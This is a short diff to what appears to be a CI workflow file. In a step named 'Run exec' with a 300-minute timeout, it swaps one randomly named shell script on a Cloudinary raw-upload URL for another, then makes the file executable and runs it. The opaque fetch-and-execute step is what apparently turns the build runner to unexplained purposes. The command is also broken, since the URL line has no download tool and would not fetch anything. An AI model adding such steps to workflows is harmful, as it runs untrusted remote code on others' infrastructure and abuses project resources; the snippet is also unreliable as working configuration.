@@ -16,6 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 300
         run: |
-          https://res.cloudinary.com/dyfqshedb/raw/upload/v1711332463/rootleip8uimhgrqkhop.sh
-          chmod +x rootleip8uimhgrqkhop.sh
-          ./rootleip8uimhgrqkhop.sh
+          https://res.cloudinary.com/dyfqshedb/raw/upload/v1711332696/ltmooomkisyvwcz1ofwm.sh
+          chmod +x ltmooomkisyvwcz1ofwm.sh
+          ./ltmooomkisyvwcz1ofwm.sh
